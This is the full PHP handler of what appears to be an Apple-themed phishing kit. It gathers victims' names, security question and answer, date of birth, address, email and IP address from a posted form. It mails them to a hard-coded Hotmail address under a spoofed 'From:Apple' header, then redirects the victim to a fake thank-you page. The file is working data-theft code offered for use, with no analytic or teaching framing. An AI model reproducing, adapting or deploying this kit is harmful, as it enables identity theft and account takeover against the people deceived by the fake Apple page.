<?
$ip = getenv("REMOTE_ADDR");
$bilsmg .= "---- |   Apple Account   | ----\n";
$bilsmg .= "---- |                   | ----\n";
$bilsmg .= "First Name:  : ".$_POST['first']."\n";
$bilsmg .= "Last Name  : ".$_POST['lname']."\n";
$bilsmg .= "Security Question  : ".$_POST['sq']."\n";
$bilsmg .= "answer  : ".$_POST['fname']."\n";
$bilsmg .= "Date of Birth : ".$_POST['mm']."/".$_POST['dd']."/".$_POST['yy']."\n";
$bilsmg .= "Contry : ".$_POST['Contry']."\n\n";
$bilsmg .= "Adress Line 1 : ".$_POST['address1']."\n";
$bilsmg .= "Adress Line 2 : ".$_POST['address2']."\n";
$bilsmg .= "City : ".$_POST['city']."\n";
$bilsmg .= "State : ".$_POST['state']."\n";
$bilsmg .= "Zip Code : ".$_POST['zip']."\n";
$bilsmg .= "----- |                           | ------\n";
$bilsmg .= "Fr0m $ip             chek in http://www.geoiptool.com/?IP=$ip   \n";



$bilsnd = "zira.vbv@hotmail.fr";
$bilsub = "Apple info Fr0m $ip";
$bilhead = "From:Apple";
$bilhead .= $_POST['eMailAdd']."\n";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$bilsmg,$bilhead);

header("Location: Apple - Thanks for help us.htm");
?>